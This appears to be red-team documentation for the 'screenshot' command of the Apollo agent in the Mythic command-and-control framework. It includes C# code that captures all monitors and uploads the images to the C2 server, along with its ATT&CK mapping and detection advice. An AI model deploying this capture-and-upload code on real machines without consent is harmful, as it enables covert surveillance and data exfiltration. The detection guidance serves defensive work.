+++
title = "screenshot"
chapter = false
weight = 103
hidden = false
+++

## Summary
Captures screenshots of all desktop sessions associated with the current process using Windows GDI+ APIs. Supports multi-monitor environments by capturing each screen independently and returns images as PNG files through Mythic's file management system.

- **Needs Admin:** False
- **Version:** 2
- **Author:** @reznok, @djhohnstein

### Arguments
No arguments required - automatically captures all available screens.

## Usage
```
screenshot
```

**Output:**
```
Multiple PNG files uploaded to Mythic file system:
- Screen 1: 1920x1080 desktop capture
- Screen 2: 1280x1024 secondary monitor capture
```

## Detailed Summary

### Agent Execution Flow

#### 1. Screen Discovery and Enumeration
```csharp
List<byte[]> captures = Screen.AllScreens.Select(GetBytesFromScreen).ToList();
```
- Uses `System.Windows.Forms.Screen.AllScreens` to enumerate all available displays
- Automatically detects multi-monitor configurations
- Creates a list to store screenshot data for each screen
- Processes screens sequentially to avoid resource conflicts

#### 2. Screen Capture Process
```csharp
private byte[] GetBytesFromScreen(Screen screen)
{
    using Bitmap bmpScreenCapture = new(screen.Bounds.Width, screen.Bounds.Height);
    using Graphics g = Graphics.FromImage(bmpScreenCapture);
    using MemoryStream ms = new();

    g.CopyFromScreen(new Point(screen.Bounds.X, screen.Bounds.Y), Point.Empty, bmpScreenCapture.Size);
    bmpScreenCapture.Save(ms, ImageFormat.Png);
    byte[] bScreen = ms.ToArray();

    return bScreen;
}
```
- Creates bitmap with exact dimensions of target screen
- Uses `Graphics.CopyFromScreen()` to capture pixel data directly from framebuffer
- Captures from screen's absolute coordinates (`screen.Bounds.X`, `screen.Bounds.Y`)
- Saves as PNG format for lossless compression
- Returns raw byte array for file upload

#### 3. Multi-Monitor Support
```csharp
// Screen.AllScreens provides access to all displays
foreach (Screen screen in Screen.AllScreens)
{
    // Each screen has bounds: X, Y, Width, Height
    Point sourcePoint = new Point(screen.Bounds.X, screen.Bounds.Y);
    Size screenSize = new Size(screen.Bounds.Width, screen.Bounds.Height);
    
    // Capture specific screen region
    g.CopyFromScreen(sourcePoint, Point.Empty, screenSize);
}
```
- Handles extended desktop configurations automatically
- Captures each monitor as separate image file
- Preserves original screen resolution and aspect ratio
- Supports non-aligned monitor arrangements

#### 4. File Management and Upload
```csharp
foreach (byte[] bScreen in captures)
{
    bool putFile = _agent.GetFileManager().PutFile(
        _cancellationToken.Token, 
        _data.ID, 
        bScreen, 
        null, 
        out string mythicFileId, 
        true
    );
    
    if (putFile is false)
    {
        DebugHelp.DebugWriteLine("put file failed");
        resp = CreateTaskResponse("", true, "error");
        break;
    }
    
    _agent.GetTaskManager().AddTaskResponseToQueue(
        CreateTaskResponse(mythicFileId, false, "")
    );
}
```
- Uploads each screenshot as separate file to Mythic
- Uses Apollo's file manager for secure transfer
- Generates unique Mythic file ID for each image
- Provides intermediate responses for real-time feedback
- Handles upload failures gracefully with error reporting

#### 5. Memory Management and Resource Cleanup
```csharp
using Bitmap bmpScreenCapture = new(screen.Bounds.Width, screen.Bounds.Height);
using Graphics g = Graphics.FromImage(bmpScreenCapture);
using MemoryStream ms = new();
```
- Uses `using` statements for automatic resource disposal
- Ensures proper cleanup of GDI+ objects
- Prevents memory leaks from bitmap and graphics handles
- Releases memory streams after PNG encoding

#### 6. Error Handling and Cancellation
```csharp
try
{
    List<byte[]> captures = Screen.AllScreens.Select(GetBytesFromScreen).ToList();
    // ... capture and upload logic
}
catch (Exception e)
{
    DebugHelp.DebugWriteLine(e.Message);
    DebugHelp.DebugWriteLine(e.StackTrace);
    resp = CreateTaskResponse(e.Message, true, "error");
    _agent.GetTaskManager().AddTaskResponseToQueue(resp);
}
```
- Comprehensive exception handling for capture failures
- Detailed error logging with stack traces
- Supports cancellation through cancellation token
- Provides meaningful error messages to operator

### Browser Script Integration

#### File Display and Download
```javascript
function(task, responses){
    if(responses.length > 0){
        let responseArr = [];
        for(let i = 0; i < responses.length; i++){
            responseArr.push({
                "agent_file_id": responses[i],
                "filename": "file.png",
            });
        }
        return {"media":responseArr};
    }else{
        return {"plaintext": "No data to display..."}
    }
}
```
- Processes multiple screenshot file IDs from agent
- Creates media array for inline image display
- Sets consistent PNG filename for downloads
- Provides fallback message if no screenshots captured

#### UI Features
- **Inline Preview**: Screenshots display directly in Mythic interface
- **Download Links**: Individual files can be downloaded
- **Multi-Monitor Support**: Each screen appears as separate image
- **Timestamp Metadata**: File creation time preserved

### GDI+ API Integration

#### Core Graphics Functions
```csharp
// System.Drawing namespace provides:
Screen.AllScreens                    // Enumerate all displays
Graphics.FromImage(bitmap)           // Create graphics context
Graphics.CopyFromScreen()            // Capture screen pixels
Bitmap.Save(stream, ImageFormat.Png) // Encode as PNG
```
- Leverages Windows GDI+ for high-performance screen capture
- Direct framebuffer access for pixel-perfect screenshots
- Hardware-accelerated image processing when available
- Supports all Windows display configurations

#### Screen Coordinate System
```csharp
// Multi-monitor coordinate mapping
Screen primaryScreen = Screen.PrimaryScreen;
// Primary: X=0, Y=0, Width=1920, Height=1080

Screen secondaryScreen = Screen.AllScreens[1];
// Secondary: X=1920, Y=0, Width=1280, Height=1024 (extended right)
// Or: X=0, Y=-1024, Width=1280, Height=1024 (extended up)
```
- Handles complex multi-monitor arrangements
- Supports negative coordinates for screens above/left of primary
- Preserves exact pixel positioning across displays
- Works with portrait/landscape mixed orientations

### Data Structures

#### Screen Information
```csharp
public class Screen
{
    public Rectangle Bounds { get; }      // Screen dimensions and position
    public string DeviceName { get; }     // Display device name
    public bool Primary { get; }          // Primary display flag
    public Rectangle WorkingArea { get; } // Available area minus taskbar
}
```

#### Image Format Specifications
- **Format**: PNG (Portable Network Graphics)
- **Compression**: Lossless compression
- **Color Depth**: 24-bit RGB or 32-bit RGBA
- **Transparency**: Supported (though not relevant for screenshots)
- **Metadata**: Minimal (timestamp, dimensions)

### Performance Considerations

#### Memory Usage
```csharp
// Memory calculation for screenshot:
// Width × Height × 4 bytes (RGBA) = RAM usage per screen
// 1920×1080×4 = ~8.3 MB per full HD screen
// Plus PNG compression overhead and temporary buffers
```
- Memory usage scales with screen resolution
- Multiple monitors increase total memory footprint
- PNG compression reduces final file size by 70-90%
- Temporary buffers released immediately after capture

#### Capture Speed
- **Typical Performance**: 50-200ms per screen
- **Factors**: Screen resolution, GPU performance, system load
- **Optimization**: Sequential capture prevents resource contention
- **Bottlenecks**: File upload typically slower than capture

### Security Implications

#### Information Disclosure
- **Sensitive Data**: May capture passwords, personal information, proprietary data
- **Multi-User Systems**: Could capture other users' sessions if permissions allow
- **Clipboard Content**: Some applications show clipboard data on screen
- **Notification Areas**: System tray may contain sensitive status information

#### Detection Considerations
- **API Calls**: `CopyFromScreen` calls may be monitored by security software
- **Process Behavior**: Unusual graphics API usage patterns
- **File Creation**: PNG files created in temp directories or memory
- **Network Traffic**: Large binary uploads to command and control

## APIs Used
| API | Purpose | Namespace |
|-----|---------|-----------|
| `Screen.AllScreens` | Enumerate all display devices | System.Windows.Forms |
| `Graphics.FromImage` | Create graphics context for bitmap | System.Drawing |
| `Graphics.CopyFromScreen` | Capture screen pixels to bitmap | System.Drawing |
| `Bitmap.Save` | Encode bitmap as PNG | System.Drawing |
| `MemoryStream` | In-memory byte stream | System.IO |

## MITRE ATT&CK Mapping
- **T1113** - Screen Capture

## Security Considerations
- **Information Exposure**: Screenshots may contain sensitive data visible on screen
- **Privacy Violation**: Captures all visible content without user consent
- **Multi-User Risk**: May capture other users' sessions on shared systems
- **Data Exfiltration**: Large image files transferred to external servers
- **Forensic Artifacts**: PNG files and API calls leave forensic traces

## Limitations
1. Requires active desktop session to capture meaningful content
2. Cannot capture content from secure desktop (UAC prompts, login screen)
3. May fail on systems with restricted graphics access
4. Large screenshots consume significant memory and bandwidth
5. Some full-screen applications may block screen capture
6. Virtual machines may have limited graphics acceleration
7. Multiple monitors increase processing time and network usage

## Error Conditions
- **No Active Session**: Fails if no desktop session is active
- **Graphics Access Denied**: Insufficient permissions to access framebuffer
- **Memory Allocation Failed**: Insufficient RAM for large screenshots
- **File Upload Failed**: Network issues preventing file transfer to Mythic
- **GDI+ Exception**: Graphics subsystem errors during capture
- **Screen Access Blocked**: Security software preventing screen capture
- **Display Driver Issues**: Hardware/driver problems affecting screen access
- **Cancellation Requested**: Task cancelled before completion

## Defensive Detection
- **Process Monitoring**: Monitor for unusual graphics API usage
- **File System**: Watch for PNG file creation in temp directories
- **Network Analysis**: Large binary uploads to suspicious destinations
- **API Hooking**: Hook `CopyFromScreen` and related graphics functions
- **Memory Analysis**: Look for large bitmap allocations
- **User Notification**: Alert users when screen capture occurs